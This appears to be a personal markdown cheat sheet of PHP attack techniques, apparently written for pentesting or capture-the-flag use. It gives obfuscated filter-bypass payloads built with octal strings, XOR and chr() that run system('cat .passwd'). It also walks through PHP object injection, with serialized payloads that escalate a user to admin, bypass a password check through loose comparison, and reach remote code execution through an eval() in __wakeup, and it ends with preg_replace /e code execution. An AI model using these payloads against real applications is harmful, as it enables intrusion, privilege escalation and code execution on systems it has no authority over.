# PHP  vuln

## PHP regex bypass

- With octal encoder https://cryptii.com/pipes/text-octal

		file_get_contents(".passwd") -> "\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163"("\056\160\141\163\163\167\144")

- xor operation

```python
import string
 
	if __name__ == "__main__":
    		s = string.printable[62:62+32] ##    !"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~
    		s1 = string.printable[:62]     ##    0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
    		for i in s:
        		for j in s:
            			x = chr(ord(i)^ord(j))
            			if x in s1+'_':
                			print '{0}\t{1}\t{2}'.format(i,j,x)
```
	
	$_ = "@" ^ "!" //a
                            	
- Convert to phpnonalpha

	Open https://hackvertor.co.uk/public# and use phpnonalpha encoder

- Unicode encoder

		$_=("#"^"@").('('^'@').('2'^'@');  // 'c' + 'h' + 'r'
 		$__=$_(115).$_(121).$_(115).$_(116).$_(101).$_(109); // here system
		$___=$_(99).$_(97).$_(116)." .".$_(112).$_(97).$_(115).$_(115).$_(119).$_(100); //here cat .passwd
 		$__($___);

## PHP object

Serialization in PHP
To understand PHP object injections, you have to first understand how PHP serialize and deserialize objects.
Serializing
When you need to store a PHP object or transfer it over the network, you use serialize() to pack it up.
serialize(): PHP object -> plain old string that represents the obj
When you need to use that data, use unserialize() to unpack and get the underlying object.
unserialize(): string containing object data -> original object
For example, this code snippet will serialize the object “user”.

```php
<?php
	class User{
		public $username;
		public $status;
	}
	$user = new User;
	$user->username = 'vickie';
	$user->status = 'not admin';
	echo serialize($user);
?>

```
Run the code snippet, and you will get the serialized string that represents the “user” object.
	
	O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
Serialized string structure
Let’s break this serialized string down! The basic structure of a PHP serialized string is “data type: data”. For example, “b” represents a boolean.
	
	b:THE_BOOLEAN;
“i” represents an integer.
	
	i:THE_INTEGER;
“d” represents a float.
	
	d:THE_FLOAT;
“s” represents a string.
	
	s:LENTH_OF_STRING:"ACTUAL_STRING";
“a” represents an array.
	
	a:NUMBER_OF_ELEMENTS:{ELEMENTS}
And finally, “O” represents an object.
	
	O:LENTH_OF_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}
So we can see our serialized string here represents an object of the class “User”. It has two properties. The first property has the name “username” and the value “vickie”. The second property has the name “status” and the value “not admin”.
	
	O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
Deserializing
When you are ready to operate on the object again, you can deserialize the string with unserialize().

```php
<?php
	class User{
		public $username;
		public $status;
	}
	$user = new User;
	$user->username = 'vickie';
	$user->status = 'not admin';
	$serialized_string = serialize($user);
	$unserialized_data = unserialize($serialized_string);
	var_dump($unserialized_data);
	var_dump($unserialized_data["status"]);
?>
```
	
Unserialize() under the hood
So how does unserialize() work under the hood? And why does it lead to vulnerabilities?
What are PHP magic methods?

PHP magic methods are function names in PHP that have “magical” properties. Learn more about them here.

The magic methods that are relevant for us now are __wakeup() and __destruct(). If the class of the serialized object implements any method named __wakeup() and __destruct(), these methods will be executed automatically when unserialize() is called on an object.

Step 1: Object instantiation
Instantiation is when the program creates an instance of a class in memory. That is what unserialize() does. It takes the serialized string, which specifies the class and the properties of that object. With that data, unserialize() creates a copy of the originally serialized object.
It will then search for a function named __wakeup(), and execute code in that function. __wakeup() reconstructs any resources that the object may have. It is used to reestablish any database connections that have been lost during serialization and perform other reinitialization tasks.

Step 2: Program uses the object
The program operates on the object and uses it to perform other actions.

Step 3: Object destruction
Finally, when no reference to the deserialized object instance exists, __destruct() is called to clean up the object.
Exploiting PHP deserialization
When you control a serialized object that is passed into unserialize(), you control the properties of the created object. You might also be able to hijack the flow of the application by controlling the values passed into automatically executed methods like __wakeup() or __destruct().
This is called a PHP object injection. PHP object injection can lead to variable manipulation, code execution, SQL injection, path traversal, or DoS.
Controlling variable values
One possible way of exploiting a PHP object injection vulnerability is variable manipulation. For example, you can mess with the values encoded in the serialized string.
	
	O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
In this serialize string, you can try to change the value of “status” to “admin”, and see if the application grants you admin privileges.
	
	O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:5:"admin";}
Getting to RCE
It’s even possible to achieve RCE using PHP object injection! For example, consider this vulnerable code snippet: (taken from https://www.owasp.org/index.php/PHP_Object_Injection)

```php
class Example2
	{
	  private $hook;   
	  function __construct(){
	      // some PHP code...
	  }   
	  function __wakeup(){
	      if (isset($this->hook)) eval($this->hook);
	  }
	}
// some PHP code...
	$user_data = unserialize($_COOKIE['data']);
// some PHP code...
```

You can achieve RCE using this deserialization flaw because a user-provided object is passed into unserialize. And the class Example2 has a magic function that runs eval() on user-provided input.
To exploit this RCE, you simply have to set your data cookie to a serialized Example2 object with the hook property set to whatever PHP code you want. You can generate the serialized object using the following code snippet:

```php
class Example2
	{
	   private $hook = "phpinfo();";
	}
```
print urlencode(serialize(new Example2));
// We need to use URL encoding since we are injecting the object via a URL.

Bypass auth :

```php
<?php if($data['password'] == $password){
	$auth=True;
	}
?>
```

If we set the password not to a string but to '1' (True) it will work because str=True is True

	a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
	
## PREG_REPLACE()

You can execute php code with the function preg_replace()

Pattern : /a/e

Replace : phpinfo();

Content : a
